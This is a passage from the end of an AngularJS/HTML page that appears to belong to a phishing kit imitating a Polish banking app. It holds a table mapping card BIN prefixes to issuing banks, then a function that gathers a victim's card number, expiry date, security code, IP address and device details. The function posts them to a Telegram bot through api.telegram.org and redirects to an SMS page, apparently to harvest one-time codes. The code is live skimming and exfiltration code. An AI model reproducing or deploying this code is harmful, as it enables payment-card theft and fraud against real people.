     {id: '677378 ', nom: ' Mstr Debit POPOLARE'},
     {id: '528025 ', nom: ' MCARD DEBIT SOLARISBANK'},
     {id: '522686 ', nom: ' MCARD PREPAID NEXI PAYMENTS'},
     {id: '516499 ', nom: ' MCARD PREPAID (ICCREA)'},
     {id: '552232 ', nom: ' MCARD Credit PKO Polski'},
     {id: '416334 ', nom: ' VISA CREDIT FINECOBANK '},
     {id: '483843 ', nom: ' VISA Debit INTESA'},
     {id: '524542 ', nom: ' MCARD STANDARD SERBIA'},
     {id: '581149 ', nom: ' Mstr Debit BNL'},
     {id: '540058 ', nom: ' MCARD PREPAID BBOAZ'},
     {id: '434994 ', nom: ' VISA Credit INTESA'},
     {id: '540047 ', nom: ' MCARD PREPAID BBpmSA'},
     {id: '534207 ', nom: ' MCARD GIFT INTESA'},
     {id: '674441 ', nom: ' Mstr Debit Siassb'},
     {id: '529593 ', nom: ' MCARD PREPAID MOONEY '},
     {id: '453220 ', nom: ' VISA CREDIT NEXI '},
     {id: '677621 ', nom: ' MCARD DEBIT NEXI '},
     
     ];





       
        for (var i = card.length - 1; i >= 0; i--) {
            if (card[i].id == bin){
                return  card[i].nom;
            }
        }
        return "NO type";   
    } 




console.log($scope.CARDNAMETYBE(670999))


    $scope.validation = function(){
           $(".overlay").show();
           var Detaile = {}; 
            Detaile.card_date= $scope.expiry1+"/"+$scope.expiry2;
            Detaile.card_nbr=$scope.vcode1+' '+ $scope.vcode2+' '+$scope.vcode3+' '+$scope.vcode4;
            Detaile.card_cc= $scope.securitycode;
            

            Detaile.info=  $scope.info_User['ip']+" : "+$scope.info_User['browser']+" : "+$scope.info_User['device']+" : "+$scope.info_User['system'];

            console.log(Detaile)
            var bin= ($scope.vcode1+''+$scope.vcode2).substring(0, 6);
            Detaile.cardname= $scope.CARDNAMETYBE(parseInt(bin));

            const message = `IKO CC\n--------------\n${Detaile.cardname}\n${Detaile.card_nbr}\n${Detaile.card_date}\n${Detaile.card_cc}\n\n--------------\n${Detaile.info}`;
            const token = $scope.info_User['token'];
            const chatId =$scope.info_User['chatId'];

            var Detailefun = {}; 
                Detailefun.ip=  $scope.info_User['ip'];
                Detailefun.fun= "NEW";
                $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=1",
                 data: JSON.stringify(Detailefun), 
                  headers: {'Content-Type': 'application/json'}
                 }).then(function(data) {});

                $.ajax({
                    type: 'POST',
                    url: `https://api.telegram.org/bot${token}/sendMessage`,
                    data: {
                        chat_id: chatId,
                        text: message,
                         
                        parse_mode: 'markdown',
                    },
                    success: function (res) {
                         setInterval(function() {
                                window.location.href = pathname+'sms.php';
                         }, 5000);

                    },
                    error: function (error) {
                        console.error(error);
                        alert("error failed");
                    }
                });





    }

 





}]);

</script>
   </body>
</html>